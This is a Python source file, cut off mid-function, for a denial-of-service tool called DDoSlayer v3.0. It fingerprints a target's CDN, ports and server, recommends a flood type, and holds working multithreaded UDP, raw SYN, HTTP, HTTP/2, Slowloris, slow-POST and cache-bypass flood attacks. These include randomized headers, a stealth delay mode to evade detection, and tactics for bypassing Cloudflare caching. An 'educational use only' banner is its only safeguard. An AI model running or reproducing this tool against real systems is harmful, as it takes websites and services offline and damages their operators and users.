#!/usr/bin/env python3
"""
DDoSlayer v3.0 - Ultimate Edition
Author: Chris 'SaintDruG' Abou-Chabké
Organization: Black Hat Ethical Hacking - www.blackhatethicalhacking.com
"""

from termcolor import colored
import sys
import os
import time
import socket
import random
import threading
from urllib.parse import urlparse
import json
from datetime import datetime
import warnings

# Suppress SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# Try to import Rich library
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
    from rich.layout import Layout
    from rich import box
    from rich.text import Text
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False
    print(colored("[!] Rich library not installed. UI will be basic.", 'yellow'))
    print(colored("[*] Install with: pip3 install rich", 'cyan'))

# Try to import optional libraries
try:
    from scapy.all import IP, TCP, send, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# User-Agent list
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
]

REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.yahoo.com/',
    'https://www.facebook.com/',
    'https://www.twitter.com/',
]

# Global variables
packets_sent = 0
packets_failed = 0
packets_lock = threading.Lock()
stop_attack = False
attack_start_time = 0
peak_rate = 0
scan_results = {}

def clear_screen():
    """Clear terminal screen"""
    os.system('clear' if os.name != 'nt' else 'cls')

def print_banner():
    clear_screen()

    if RICH_AVAILABLE:
        from rich.align import Align

        title = Text()

        colors = [
            "bright_green",
            "cyan",
            "hot_pink",
            "bright_green",
            "cyan",
            "hot_pink",
            "bright_green",
            "cyan",
            "hot_pink",
            "bright_green"
        ]

        name = "DDoSlayer"

        for i, letter in enumerate(name):
            title.append(letter, style=f"bold {colors[i % len(colors)]}")

        title.append(" v3.0", style="bold white")

        subtitle = Text("Ultimate Edition", style="bold hot_pink")

        console.print()
        console.print(Align.center(title))
        console.print(Align.center(subtitle))
        console.print()

        
        info_text = "[green]Author[/green]   : Chris 'SaintDruG' Abou-Chabké\n"
        info_text += "[magenta]Website[/magenta]  : https://www.blackhatethicalhacking.com\n"
        info_text += "[red]Github[/red]   : https://github.com/blackhatethicalhacking\n"
        info_text += "[yellow]WARNING[/yellow]  : Educational Use Only - Authorized Testing Required"
        
        console.print(Panel(info_text, border_style="magenta", box=box.ROUNDED))
    else:
        # Fallback for no Rich
        print(colored("=" * 60, 'cyan'))
        print(colored("          DDoSlayer v3.0 - Ultimate Edition", 'green'))
        print(colored("=" * 60, 'cyan'))
        print(colored("Author   : Chris 'SaintDruG' Abou-Chabké", 'green'))
        print(colored("Website  : https://www.blackhatethicalhacking.com", 'magenta'))
        print(colored("Github   : https://github.com/blackhatethicalhacking", 'red'))
        print(colored("WARNING  : Educational Use Only - Authorized Testing Required", 'yellow'))
        print(colored("=" * 60, 'cyan'))

def get_random_headers():
    """Generate random HTTP headers"""
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Referer': random.choice(REFERERS),
        'Cache-Control': 'max-age=0',
    }

def get_random_bytes(size):
    """Generate random bytes"""
    return bytes([random.randint(0, 255) for _ in range(size)])

def resolve_target(target):
    """Resolve target URL/IP to IP, port, and scheme"""
    try:
        if target.startswith('http://') or target.startswith('https://'):
            parsed = urlparse(target)
            hostname = parsed.hostname
            port = parsed.port if parsed.port else (443 if parsed.scheme == 'https' else 80)
            scheme = parsed.scheme
            ip = socket.gethostbyname(hostname)
            return ip, port, scheme, target
        else:
            ip = socket.gethostbyname(target)
            return ip, None, None, None
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[red][!] Error resolving target: {e}[/red]")
        else:
            print(colored(f"[!] Error resolving target: {e}", 'red'))
        return None, None, None, None

# ==================== TARGET SCANNER ====================
def scan_port(ip, port, timeout=1):
    """Check if a port is open"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def detect_cdn(hostname, ip):
    """Detect CDN/WAF protection"""
    cdn_signatures = {
        'cloudflare': ['cloudflare', 'cf-ray'],
        'akamai': ['akamai', 'akamai-x-cache'],
        'cloudfront': ['cloudfront', 'x-amz-cf'],
        'fastly': ['fastly', 'x-fastly'],
        'imperva': ['imperva', 'incapsula'],
        'sucuri': ['sucuri', 'x-sucuri'],
    }
    
    detected_cdn = None
    
    try:
        if DNS_AVAILABLE:
            try:
                answers = dns.resolver.resolve(hostname, 'CNAME')
                for rdata in answers:
                    cname = str(rdata.target).lower()
                    for cdn, keywords in cdn_signatures.items():
                        if any(keyword in cname for keyword in keywords):
                            detected_cdn = cdn.capitalize()
                            break
            except:
                pass
        
        if not detected_cdn and REQUESTS_AVAILABLE:
            try:
                response = requests.get(f'http://{hostname}', timeout=3, verify=False)
                headers_str = str(response.headers).lower()
                
                for cdn, keywords in cdn_signatures.items():
                    if any(keyword in headers_str for keyword in keywords):
                        detected_cdn = cdn.capitalize()
                        break
            except:
                pass
    except:
        pass
    
    return detected_cdn if detected_cdn else "None"

def detect_server(hostname):
    """Detect web server type"""
    try:
        if not REQUESTS_AVAILABLE:
            return "Unknown"
        
        response = requests.get(f'http://{hostname}', timeout=3, verify=False)
        server = response.headers.get('Server', 'Unknown')
        powered_by = response.headers.get('X-Powered-By', '')
        if powered_by:
            server += f" ({powered_by})"
        
        return server
    except:
        return "Unknown"

def check_xmlrpc(url):
    """Check if XML-RPC is enabled"""
    try:
        if not REQUESTS_AVAILABLE:
            return False
        
        xmlrpc_url = url.rstrip('/') + '/xmlrpc.php'
        response = requests.get(xmlrpc_url, timeout=3, verify=False)
        return response.status_code == 200 and 'XML-RPC' in response.text
    except:
        return False

def check_websocket(hostname, port):
    """Check for WebSocket support"""
    try:
        if not REQUESTS_AVAILABLE:
            return False
        
        headers = {
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Version': '13',
            'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ=='
        }
        
        response = requests.get(f'http://{hostname}:{port}', headers=headers, timeout=3, verify=False)
        return response.status_code == 101 or 'websocket' in response.headers.get('Upgrade', '').lower()
    except:
        return False

def measure_response_time(hostname, port, scheme='http'):
    """Measure average response time"""
    times = []
    for _ in range(3):
        try:
            start = time.time()
            if REQUESTS_AVAILABLE:
                requests.get(f'{scheme}://{hostname}:{port}', timeout=5, verify=False)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((hostname, port))
                sock.close()
            end = time.time()
            times.append((end - start) * 1000)
        except:
            pass
    
    return int(sum(times) / len(times)) if times else 0

def auto_scan_target(target):
    """Comprehensive target scanning and analysis"""
    global scan_results
    
    if RICH_AVAILABLE:
        console.print("\n[cyan]" + "=" * 60 + "[/cyan]")
        console.print("[bold green]TARGET RECONNAISSANCE IN PROGRESS[/bold green]")
        console.print("[cyan]" + "=" * 60 + "[/cyan]\n")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            console=console
        ) as progress:
            
            task1 = progress.add_task("[cyan]Resolving DNS...", total=100)
            ip, port, scheme, url = resolve_target(target)
            progress.update(task1, completed=100)
            
            if not ip:
                console.print("[red][!] Failed to resolve target[/red]")
                return None
            
            if url:
                hostname = urlparse(url).hostname
            else:
                hostname = target
                url = f"http://{hostname}"
            
            scan_results['ip'] = ip
            scan_results['hostname'] = hostname
            scan_results['url'] = url
            
            task2 = progress.add_task("[cyan]Detecting CDN/WAF...", total=100)
            cdn = detect_cdn(hostname, ip)
            scan_results['cdn'] = cdn
            progress.update(task2, completed=100)
            
            task3 = progress.add_task("[cyan]Scanning ports...", total=100)
            common_ports = [80, 443, 8080, 8443]
            open_ports = []
            for p in common_ports:
                if scan_port(ip, p, timeout=0.5):
                    open_ports.append(p)
            scan_results['open_ports'] = open_ports if open_ports else [port] if port else [80]
            progress.update(task3, completed=100)
            
            task4 = progress.add_task("[cyan]Fingerprinting server...", total=100)
            server = detect_server(hostname)
            scan_results['server'] = server
            progress.update(task4, completed=100)
            
            task5 = progress.add_task("[cyan]Measuring response...", total=100)
            response_time = measure_response_time(hostname, port if port else 80, scheme if scheme else 'http')
            scan_results['response_time'] = response_time
            progress.update(task5, completed=100)
            
            task6 = progress.add_task("[cyan]Checking vulnerabilities...", total=100)
            xmlrpc_enabled = check_xmlrpc(url)
            scan_results['xmlrpc'] = xmlrpc_enabled
            ws_enabled = check_websocket(hostname, port if port else 80)
            scan_results['websocket'] = ws_enabled
            progress.update(task6, completed=100)
        
        console.print("\n[green][+] Reconnaissance completed![/green]\n")
    else:
        # Fallback without Rich
        print(colored("\n" + "=" * 60, 'cyan'))
        print(colored("TARGET RECONNAISSANCE IN PROGRESS", 'green'))
        print(colored("=" * 60 + "\n", 'cyan'))
        
        print(colored("[*] Resolving DNS...", 'cyan'))
        ip, port, scheme, url = resolve_target(target)
        
        if not ip:
            print(colored("[!] Failed to resolve target", 'red'))
            return None
        
        if url:
            hostname = urlparse(url).hostname
        else:
            hostname = target
            url = f"http://{hostname}"
        
        scan_results['ip'] = ip
        scan_results['hostname'] = hostname
        scan_results['url'] = url
        
        print(colored("[*] Detecting CDN/WAF...", 'cyan'))
        cdn = detect_cdn(hostname, ip)
        scan_results['cdn'] = cdn
        
        print(colored("[*] Scanning ports...", 'cyan'))
        common_ports = [80, 443, 8080, 8443]
        open_ports = []
        for p in common_ports:
            if scan_port(ip, p, timeout=0.5):
                open_ports.append(p)
        scan_results['open_ports'] = open_ports if open_ports else [port] if port else [80]
        
        print(colored("[*] Fingerprinting server...", 'cyan'))
        server = detect_server(hostname)
        scan_results['server'] = server
        
        print(colored("[*] Measuring response...", 'cyan'))
        response_time = measure_response_time(hostname, port if port else 80, scheme if scheme else 'http')
        scan_results['response_time'] = response_time
        
        print(colored("[*] Checking vulnerabilities...", 'cyan'))
        xmlrpc_enabled = check_xmlrpc(url)
        scan_results['xmlrpc'] = xmlrpc_enabled
        ws_enabled = check_websocket(hostname, port if port else 80)
        scan_results['websocket'] = ws_enabled
        
        print(colored("\n[+] Reconnaissance completed!\n", 'green'))
    
    return scan_results

def recommend_attack(scan_results):
    """AI-powered attack recommendation"""
    recommendations = []
    
    cdn = scan_results.get('cdn', 'None').lower()
    xmlrpc = scan_results.get('xmlrpc', False)
    websocket = scan_results.get('websocket', False)
    response_time = scan_results.get('response_time', 0)
    
    if 'cloudflare' in cdn:
        recommendations.append({
            'attack': 'Cache Bypass',
            'attack_id': 7,
            'confidence': 92,
            'reason': 'Cloudflare detected. Cache bypass targets origin directly.',
            'threads': 150,
            'stealth': False
        })
    elif xmlrpc:
        recommendations.append({
            'attack': 'XML-RPC Flood',
            'attack_id': 8,
            'confidence': 95,
            'reason': 'XML-RPC endpoint enabled (WordPress detected).',
            'threads': 100,
            'stealth': False
        })
    elif websocket:
        recommendations.append({
            'attack': 'WebSocket Flood',
            'attack_id': 9,
            'confidence': 90,
            'reason': 'WebSocket endpoint detected. Lower overhead.',
            'threads': 120,
            'stealth': False
        })
    elif response_time > 500:
        recommendations.append({
            'attack': 'Slowloris',
            'attack_id': 5,
            'confidence': 88,
            'reason': 'Slow response time. Server vulnerable to slow attacks.',
            'threads': 10,
            'stealth': False
        })
    elif 'none' in cdn:
        recommendations.append({
            'attack': 'HTTP/2 Flood',
            'attack_id': 4,
            'confidence': 90,
            'reason': 'No CDN protection. HTTP/2 flood highly effective.',
            'threads': 150,
            'stealth': False
        })
    else:
        recommendations.append({
            'attack': 'HTTP Flood',
            'attack_id': 3,
            'confidence': 75,
            'reason': 'Standard HTTP flood recommended.',
            'threads': 100,
            'stealth': False
        })
    
    return recommendations[0] if recommendations else None

def display_scan_results(scan_results, recommendation):
    """Display formatted scan results and recommendation"""
    
    if RICH_AVAILABLE:
        # Analysis table
        analysis_table = Table(title="TARGET ANALYSIS", box=box.DOUBLE_EDGE, border_style="cyan")
        analysis_table.add_column("Item", style="green", width=20)
        analysis_table.add_column("Value", style="white", width=35)
        
        analysis_table.add_row("[>] Target", scan_results['hostname'])
        analysis_table.add_row("[>] IP Address", scan_results['ip'])
        
        cdn_style = "yellow" if scan_results['cdn'] != 'None' else "white"
        analysis_table.add_row("[!] CDN/WAF", f"[{cdn_style}]{scan_results['cdn']}[/{cdn_style}]")
        
        analysis_table.add_row("[+] Server", scan_results['server'])
        
        ports_str = ', '.join(map(str, scan_results['open_ports']))
        analysis_table.add_row("[+] Open Ports", ports_str)
        
        analysis_table.add_row("[~] Response Time", f"{scan_results['response_time']}ms")
        
        console.print(analysis_table)
        
        # Target Assessment
        vuln_table = Table(title="TARGET ASSESSMENT", box=box.DOUBLE_EDGE, border_style="cyan")
        vuln_table.add_column("Check", style="green", width=25)
        vuln_table.add_column("Status", style="white", width=30)
        
        xmlrpc_status = "[green]ENABLED[/green]" if scan_results.get('xmlrpc') else "[white]Disabled[/white]"
        vuln_table.add_row("XML-RPC Endpoint", xmlrpc_status)
        
        ws_status = "[green]FOUND[/green]" if scan_results.get('websocket') else "[white]Not Found[/white]"
        vuln_table.add_row("WebSocket Support", ws_status)
        
        cdn_status = "[yellow]ACTIVE[/yellow]" if scan_results['cdn'] != 'None' else "[green]None[/green]"
        vuln_table.add_row("CDN Protection", cdn_status)
        
        console.print(vuln_table)
        
        # Recommendation panel
        if recommendation:
            rec_text = f"[bold green]► RECOMMENDED ATTACK: {recommendation['attack']}[/bold green]\n\n"
            rec_text += f"[yellow]Confidence:[/yellow] {recommendation['confidence']}%\n"
            rec_text += f"[yellow]Reason:[/yellow] {recommendation['reason']}\n\n"
            rec_text += f"[cyan]Optimal Threads:[/cyan] {recommendation['threads']}\n"
            rec_text += f"[cyan]Stealth Mode:[/cyan] {'Enabled' if recommendation['stealth'] else 'Disabled'}"
            
            rec_panel = Panel(rec_text, title="[bold magenta]AI RECOMMENDATION[/bold magenta]", border_style="magenta", box=box.DOUBLE)
            console.print(rec_panel)
        
        # Options
        console.print("\n[green][1][/green] Proceed with Recommended Attack")
        console.print("[yellow][2][/yellow] Choose Different Attack")
        console.print("[white][3][/white] Return to Main Menu\n")
        
    else:
        # Fallback without Rich
        print(colored("\n" + "=" * 60, 'cyan'))
        print(colored("TARGET ANALYSIS", 'green'))
        print(colored("=" * 60, 'cyan'))
        print(colored(f"[>] Target:        {scan_results['hostname']}", 'white'))
        print(colored(f"[>] IP Address:    {scan_results['ip']}", 'white'))
        
        cdn_color = 'yellow' if scan_results['cdn'] != 'None' else 'white'
        print(colored(f"[!] CDN/WAF:       {scan_results['cdn']}", cdn_color))
        
        print(colored(f"[+] Server:        {scan_results['server']}", 'white'))
        ports_str = ', '.join(map(str, scan_results['open_ports']))
        print(colored(f"[+] Open Ports:    {ports_str}", 'white'))
        print(colored(f"[~] Response Time: {scan_results['response_time']}ms", 'white'))
        
        print(colored("\n" + "=" * 60, 'cyan'))
        print(colored("TARGET ASSESSMENT", 'green'))
        print(colored("=" * 60, 'cyan'))
        
        xmlrpc_text = "ENABLED" if scan_results.get('xmlrpc') else "Disabled"
        xmlrpc_color = 'green' if scan_results.get('xmlrpc') else 'white'
        print(colored(f"XML-RPC:    {xmlrpc_text}", xmlrpc_color))
        
        ws_text = "FOUND" if scan_results.get('websocket') else "Not Found"
        ws_color = 'green' if scan_results.get('websocket') else 'white'
        print(colored(f"WebSocket:  {ws_text}", ws_color))
        
        cdn_text = "ACTIVE" if scan_results['cdn'] != 'None' else "None"
        cdn_color = 'yellow' if scan_results['cdn'] != 'None' else 'green'
        print(colored(f"CDN:        {cdn_text}", cdn_color))
        
        if recommendation:
            print(colored("\n" + "=" * 60, 'cyan'))
            print(colored("AI RECOMMENDATION", 'magenta'))
            print(colored("=" * 60, 'cyan'))
            print(colored(f"► Attack:      {recommendation['attack']}", 'green'))
            print(colored(f"  Confidence:  {recommendation['confidence']}%", 'yellow'))
            print(colored(f"  Reason:      {recommendation['reason']}", 'white'))
            print(colored(f"  Threads:     {recommendation['threads']}", 'cyan'))
        
        print(colored("\n[1] Proceed  [2] Choose Different  [3] Menu\n", 'white'))

# ==================== ATTACK FUNCTIONS ====================
# (Keeping all attack functions exactly the same as before)
# UDP Flood, SYN Flood, HTTP Flood, etc. - no changes needed

def udp_flood_thread(ip, port, duration, stealth=False):
    """Enhanced UDP flood with random payload sizes"""
    global packets_sent, packets_failed, stop_attack
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + duration
    
    while time.time() < timeout and not stop_attack:
        try:
            payload_size = random.randint(64, 1024)
            message = get_random_bytes(payload_size)
            sock.sendto(message, (ip, port))
            
            with packets_lock:
                packets_sent += 1
            
            if stealth:
                time.sleep(random.uniform(0.1, 2.0))
                
        except Exception as e:
            with packets_lock:
                packets_failed += 1
    
    sock.close()

def udp_flood(ip, port, duration, threads=10, stealth=False):
    """Multi-threaded UDP flood attack"""
    global packets_sent, packets_failed, stop_attack, attack_start_time, peak_rate
    packets_sent = 0
    packets_failed = 0
    stop_attack = False
    peak_rate = 0
    
    if RICH_AVAILABLE:
        console.print(f"\n[cyan][*] Starting UDP flood with {threads} threads...[/cyan]")
        console.print(f"[yellow][*] Target: {ip}:{port}[/yellow]")
        console.print(f"[yellow][*] Stealth Mode: {'Enabled' if stealth else 'Disabled'}[/yellow]")
    else:
        print(colored(f"\n[*] Starting UDP flood with {threads} threads...", 'cyan'))
        print(colored(f"[*] Target: {ip}:{port}", 'yellow'))
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=udp_flood_thread, args=(ip, port, duration, stealth))
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    attack_start_time = time.time()
    display_attack_progress(duration, "UDP FLOOD")
    
    for t in thread_list:
        t.join()
    
    return generate_attack_summary("UDP Flood", ip, port, duration, threads, stealth)

def syn_flood_thread_scapy(ip, port, duration, stealth=False):
    """Real SYN flood using Scapy"""
    global packets_sent, packets_failed, stop_attack
    
    timeout = time.time() + duration
    
    while time.time() < timeout and not stop_attack:
        try:
            src_port = RandShort()
            ip_layer = IP(dst=ip)
            tcp_layer = TCP(sport=src_port, dport=port, flags='S')
            send(ip_layer/tcp_layer, verbose=0)
            
            with packets_lock:
                packets_sent += 1
            
            if stealth:
                time.sleep(random.uniform(0.1, 1.0))
                
        except Exception as e:
            with packets_lock:
                packets_failed += 1

def syn_flood_thread_connect(ip, port, duration, stealth=False):
    """Fallback SYN flood using TCP connect"""
    global packets_sent, packets_failed, stop_attack
    
    timeout = time.time() + duration
    
    while time.time() < timeout and not stop_attack:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((ip, port))
            
            with packets_lock:
                packets_sent += 1
            
            sock.close()
            
            if stealth:
                time.sleep(random.uniform(0.1, 1.0))
        except:
            with packets_lock:
                packets_failed += 1

def syn_flood(ip, port, duration, threads=50, stealth=False):
    """Multi-threaded SYN flood attack"""
    global packets_sent, packets_failed, stop_attack, attack_start_time, peak_rate
    packets_sent = 0
    packets_failed = 0
    stop_attack = False
    peak_rate = 0
    
    if SCAPY_AVAILABLE:
        msg = f"[*] Starting REAL SYN flood with {threads} threads (Scapy)..."
        target_func = syn_flood_thread_scapy
    else:
        msg = f"[*] Starting SYN flood with {threads} threads (TCP connect)..."
        target_func = syn_flood_thread_connect
    
    if RICH_AVAILABLE:
        console.print(f"\n[cyan]{msg}[/cyan]")
        console.print(f"[yellow][*] Target: {ip}:{port}[/yellow]")
    else:
        print(colored(f"\n{msg}", 'cyan'))
        print(colored(f"[*] Target: {ip}:{port}", 'yellow'))
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=target_func, args=(ip, port, duration, stealth))
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    attack_start_time = time.time()
    display_attack_progress(duration, "SYN FLOOD")
    
    for t in thread_list:
        t.join()
    
    return generate_attack_summary("SYN Flood", ip, port, duration, threads, stealth)

def http_flood_thread(ip, port, duration, path="/", stealth=False):
    """Enhanced HTTP flood with random headers"""
    global packets_sent, packets_failed, stop_attack
    
    timeout = time.time() + duration
    
    while time.time() < timeout and not stop_attack:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            
            random_param = f"?cache={random.randint(1000000, 9999999)}"
            headers = get_random_headers()
            
            http_request = f"GET {path}{random_param} HTTP/1.1\r\n"
            http_request += f"Host: {ip}\r\n"
            
            for key, value in headers.items():
                http_request += f"{key}: {value}\r\n"
            
            http_request += "\r\n"
            sock.sendall(http_request.encode())
            
            with packets_lock:
                packets_sent += 1
            
            sock.close()
            
            if stealth:
                time.sleep(random.uniform(0.1, 2.0))
                
        except Exception as e:
            with packets_lock:
                packets_failed += 1

def http_flood(ip, port, duration, threads=100, path="/", stealth=False):
    """Multi-threaded HTTP flood attack"""
    global packets_sent, packets_failed, stop_attack, attack_start_time, peak_rate
    packets_sent = 0
    packets_failed = 0
    stop_attack = False
    peak_rate = 0
    
    if RICH_AVAILABLE:
        console.print(f"\n[cyan][*] Starting HTTP flood with {threads} threads...[/cyan]")
        console.print(f"[yellow][*] Target: {ip}:{port}{path}[/yellow]")
    else:
        print(colored(f"\n[*] Starting HTTP flood with {threads} threads...", 'cyan'))
        print(colored(f"[*] Target: {ip}:{port}{path}", 'yellow'))
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=http_flood_thread, args=(ip, port, duration, path, stealth))
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    attack_start_time = time.time()
    display_attack_progress(duration, "HTTP FLOOD")
    
    for t in thread_list:
        t.join()
    
    return generate_attack_summary("HTTP Flood", ip, port, duration, threads, stealth)

def http2_flood_thread(target_url, duration, stealth=False):
    """HTTP/2 flood using requests library"""
    global packets_sent, packets_failed, stop_attack
    
    if not REQUESTS_AVAILABLE:
        return
    
    timeout = time.time() + duration
    session = requests.Session()
    
    while time.time() < timeout and not stop_attack:
        try:
            headers = get_random_headers()
            random_url = f"{target_url}?cache={random.randint(1000000, 9999999)}"
            
            response = session.get(random_url, headers=headers, timeout=2, verify=False)
            
            with packets_lock:
                packets_sent += 1
            
            if stealth:
                time.sleep(random.uniform(0.1, 2.0))
                
        except Exception as e:
            with packets_lock:
                packets_failed += 1

def http2_flood(target_url, duration, threads=100, stealth=False):
    """Multi-threaded HTTP/2 flood attack"""
    global packets_sent, packets_failed, stop_attack, attack_start_time, peak_rate
    packets_sent = 0
    packets_failed = 0
    stop_attack = False
    peak_rate = 0
    
    if not REQUESTS_AVAILABLE:
        if RICH_AVAILABLE:
            console.print("[red][!] Requests library required[/red]")
        else:
            print(colored("[!] Requests library required", 'red'))
        return None
    
    if RICH_AVAILABLE:
        console.print(f"\n[cyan][*] Starting HTTP/2 flood with {threads} threads...[/cyan]")
        console.print(f"[yellow][*] Target: {target_url}[/yellow]")
    else:
        print(colored(f"\n[*] Starting HTTP/2 flood with {threads} threads...", 'cyan'))
        print(colored(f"[*] Target: {target_url}", 'yellow'))
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=http2_flood_thread, args=(target_url, duration, stealth))
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    attack_start_time = time.time()
    display_attack_progress(duration, "HTTP/2 FLOOD")
    
    for t in thread_list:
        t.join()
    
    return generate_attack_summary("HTTP/2 Flood", target_url, None, duration, threads, stealth)

def slowloris_thread(ip, port, duration, stealth=False):
    """Slowloris attack"""
    global packets_sent, packets_failed, stop_attack
    
    timeout = time.time() + duration
    sockets_list = []
    
    try:
        for _ in range(100):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((ip, port))
                
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {ip}\r\n".encode())
                sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                
                sockets_list.append(sock)
            except:
                pass
        
        while time.time() < timeout and not stop_attack:
            for sock in list(sockets_list):
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    with packets_lock:
                        packets_sent += 1
                except:
                    sockets_list.remove(sock)
            
            sleep_time = 15 if not stealth else random.uniform(10, 30)
            time.sleep(sleep_time)
    except KeyboardInterrupt:
        stop_attack = True
    finally:
        for sock in sockets_list:
            try:
                sock.close()
            except:
                pass

def slowloris(ip, port, duration, threads=5, stealth=False):
    """Slowloris attack launcher"""
    global packets_sent, packets_failed, stop_attack, attack_start_time, peak_rate
    packets_sent = 0
    packets_failed = 0
    stop_attack = False
    peak_rate = 0
    
    if RICH_AVAILABLE:
        console.print(f"\n[cyan][*] Starting Slowloris with {threads} threads...[/cyan]")
        console.print(f"[yellow][*] Target: {ip}:{port}[/yellow]")
    else:
        print(colored(f"\n[*] Starting Slowloris with {threads} threads...", 'cyan'))
        print(colored(f"[*] Target: {ip}:{port}", 'yellow'))
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=slowloris_thread, args=(ip, port, duration, stealth))
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    attack_start_time = time.time()
    display_attack_progress(duration, "SLOWLORIS")
    
    for t in thread_list:
        t.join()
    
    return generate_attack_summary("Slowloris", ip, port, duration, threads, stealth)

def slow_post_thread(ip, port, duration, stealth=False):
    """Slow POST attack"""
    global packets_sent, packets_failed, stop_attack
    
    timeout = time.time() + duration
    
    while time.time() < timeout and not stop_attack:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((ip, port))
            
            headers = get_random_headers()
            post_request = f"POST /?{random.randint(0, 2000)} HTTP/1.1\r\n"
            post_request += f"Host: {ip}\r\n"
            post_request += f"Content-Length: 1000000\r\n"
            post_request += f"Content-Type: application/x-www-form-urlencoded\r\n"
            
            for key, value in headers.items():
                post_request += f"{key}: {value}\r\n"
            
            post_request += "\r\n"
            sock.sendall(post_request.encode())
            
            for i in range(100):
                if stop_attack:
                    break
                try:
                    sock.send(f"data={random.randint(0, 9)}&".encode())
                    with packets_lock:
                        packets_sent += 1
                    sleep_time = 1 if not stealth else random.uniform(0.5, 2.0)
                    time.sleep(sleep_time)
                except:
                    break
            
            sock.close()
        except Exception as e:
            with packets_lock:
                packets_failed += 1

def slow_post(ip, port, duration, threads=50, stealth=False):
    """Slow POST attack launcher"""
    global packets_sent, packets_failed, stop_attack, attack_start_time, peak_rate
    packets_sent = 0
    packets_failed = 0
    stop_attack = False
    peak_rate = 0
    
    if RICH_AVAILABLE:
        console.print(f"\n[cyan][*] Starting Slow POST with {threads} threads...[/cyan]")
        console.print(f"[yellow][*] Target: {ip}:{port}[/yellow]")
    else:
        print(colored(f"\n[*] Starting Slow POST with {threads} threads...", 'cyan'))
        print(colored(f"[*] Target: {ip}:{port}", 'yellow'))
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=slow_post_thread, args=(ip, port, duration, stealth))
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    attack_start_time = time.time()
    display_attack_progress(duration, "SLOW POST")
    
    for t in thread_list:
        t.join()
    
    return generate_attack_summary("Slow POST", ip, port, duration, threads, stealth)

def cache_bypass_thread(target_url, duration, stealth=False):
    """Cache bypass attack"""
    global packets_sent, packets_failed, stop_attack
    
    if not REQUESTS_AVAILABLE:
        return
    
    timeout = time.time() + duration
    session = requests.Session()
    
    while time.time() < timeout and not stop_attack:
        try:
            headers = get_random_headers()
            random_params = f"?nocache={random.randint(1000000, 9999999)}"
            random_params += f"&timestamp={int(time.time() * 1000)}"
            random_params += f"&random={random.random()}"
            
            response = session.get(f"{target_url}{random_params}", headers=headers, timeout=2, verify=False)
            
            with packets_lock:
                packets_sent += 1
            
            if stealth:
                time.sleep(random.uniform(0.1, 2.0))
        except Exception as e:
            with packets_lock:
                packets_failed += 1

def cache_bypass(target_url, duration, threads=100, stealth=False):
    """Cache bypass attack launcher"""
    global packets_sent, packets_failed, stop_attack, attack_start_time, peak_rate
    packets_sent = 0
    packets_failed = 0
    stop_attack = False
    peak_rate = 0
    
    if not REQUESTS_AVAILABLE:
        if RICH_AVAILABLE:
            console.print("[red][!] Requests library required[/red]")
        else:
            print(colored("[!] Requests library required", 'red'))
        return None
    
    if RICH_AVAILABLE:
